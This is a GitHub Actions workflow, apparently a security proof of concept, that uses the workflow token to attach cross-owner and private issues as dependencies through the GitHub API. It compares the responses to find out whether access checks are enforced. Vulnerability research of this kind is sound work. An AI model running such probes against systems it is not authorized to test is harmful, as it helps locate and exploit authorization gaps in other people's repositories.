name: depidor
on:
  push:
    branches: [main]
  workflow_dispatch: {}
permissions:
  issues: write
jobs:
  poc:
    runs-on: ubuntu-latest
    steps:
      - name: discriminate
        env:
          GH_TOKEN: ${{ github.token }}
        run: |
          echo "=== A) GITHUB_TOKEN refs READABLE cross-owner public issue rails/rails#57732 (id 4660905307) ==="
          a=$(curl -s -o /tmp/a.json -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2026-03-10" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by -d '{"issue_id":4660905307}')
          echo "READABLE cross-owner ref -> HTTP $a"
          echo "body: $(head -c 240 /tmp/a.json)"
          echo ""
          echo "=== B) GITHUB_TOKEN refs UNREADABLE private same-owner si-child#1 (id 4661219265) ==="
          b=$(curl -s -o /tmp/b.json -w '%{http_code}' -X POST -H "Authorization: Bearer $GH_TOKEN" -H "Accept: application/vnd.github+json" -H "X-GitHub-Api-Version: 2026-03-10" https://api.github.com/repos/jackpas23/si-parent/issues/1/dependencies/blocked_by -d '{"issue_id":4661219265}')
          echo "UNREADABLE private ref -> HTTP $b"
          echo "body: $(head -c 240 /tmp/b.json)"
          echo ""
          echo "DISCRIMINATOR: if A=201 and B=403 -> real access-check (user PAT likely enforced). If A=403 too -> integration blanket-blocked (user PAT path OPEN)."
